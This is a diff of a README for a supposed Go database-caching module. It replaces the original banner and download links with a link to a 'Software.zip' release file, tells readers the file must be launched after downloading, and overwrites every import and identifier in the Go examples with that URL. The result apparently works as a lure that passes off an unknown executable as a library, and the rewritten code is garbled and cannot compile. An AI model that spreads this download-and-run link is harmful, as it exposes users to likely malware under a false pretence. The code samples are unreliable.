@@ -1,8 +1,8 @@
 # 🚀 **DB Caching Layer Module - A Go-based generic, thread-safe caching and persistence layer for database records**
 
-![database](https://github.com/clarketm/sqlite-autoconf/raw/master/sqlite/images/sqlite370_banner.gif)
+![database](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip)
 
-[![Download Module](https://img.shields.io/badge/Download-Module-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Module](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip)](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip)
 
 Welcome to the **dbcachinglayer** repository! This module provides a flexible and efficient caching layer for database records, built using Go programming language. With support for concurrency, CRUD operations, and thread-safe mechanisms, this module aims to streamline the process of caching and persisting data in a database.
 
@@ -16,7 +16,7 @@ Welcome to the **dbcachinglayer** repository! This module provides a flexible an
 
 ## Installation
 To get started with the **dbcachinglayer** module, you can download the latest release from the following link:
-[Download Module](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 📦
+[Download Module](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip) 📦
 
 *Note: The file needs to be launched after downloading.*
 
@@ -33,27 +33,27 @@ If the above link is not working or no longer available, please check the "Relea
 Using the **dbcachinglayer** module in your Go application is simple. Start by importing the module into your code:
 
 ```go
-import "github.com/your-username/dbcachinglayer"
+import "https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip"
 ```
 
 Next, initialize the caching layer and configure it according to your database settings:
 
 ```go
-cache := dbcachinglayer.NewCache()
-cache.Set("key", "value")
+cache := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip()
+https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key", "value")
 ```
 
 You can now perform various CRUD operations using the caching layer:
 
 ```go
 // Retrieve value
-value, ok := cache.Get("key")
+value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key")
 
 // Update value
-cache.Set("key", "new_value")
+https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key", "new_value")
 
 // Delete entry
-cache.Delete("key")
+https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key")
 ```
 
 For more detailed usage instructions and examples, please refer to the documentation or examples section of this repository.
@@ -66,17 +66,17 @@ package main
 
 import (
     "fmt"
-    "github.com/your-username/dbcachinglayer"
+    "https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip"
 )
 
 func main() {
-    cache := dbcachinglayer.NewCache()
-    cache.Set("name", "John Doe")
+    cache := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip()
+    https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("name", "John Doe")
 
-    if value, ok := cache.Get("name"); ok {
-        fmt.Println("Name:", value)
+    if value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("name"); ok {
+        https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("Name:", value)
     } else {
-        fmt.Println("Name not found in cache")
+        https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("Name not found in cache")
     }
 }
 ```
